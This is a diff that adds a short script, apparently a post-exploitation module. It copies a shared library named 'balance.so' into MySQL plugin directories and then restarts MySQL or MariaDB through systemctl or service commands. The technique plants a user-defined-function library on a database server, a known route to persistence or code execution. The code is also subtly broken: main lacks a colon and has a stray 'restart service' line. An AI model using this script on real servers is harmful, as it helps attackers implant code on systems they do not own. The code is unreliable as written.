@@ -1,0 +1,38 @@
+def deploy_udf():
+    paths = [
+        "/usr/lib/mysql/plugin/",
+        "/usr/lib64/mysql/plugin/",
+        "/usr/local/mysql/lib/plugin/",
+        "/usr/libexec/mysql/plugin/"
+    ]
+
+    for path in paths:
+        if file.is_dir(path): 
+            assets.copy("assets/balance.so", path) 
+            return True
+
+
+def is_using_systemd():
+    command_get_res = sys.shell("command -v systemctl")
+    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        for canary in ["/run/systemd/system/", "/dev/.run/systemd/", "/dev/.systemd/"]:
+            if file.is_dir(canary):
+                return True
+    return False
+
+def is_using_sysvinit():
+    command_get_res = sys.shell("command -v update-rc.d")
+    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        return True
+    return False
+
+
+def main()
+    if deploy_udf():
+        restart service 
+        if is_using_systemd():
+            sys.shell("systemctl restart mysql || systemctl restart mariadb")
+        elif is_using_sysvinit():
+            sys.shell("service mysql restart || service mariadb restart")
+    else: 
+        print("Failed to deploy UDF")
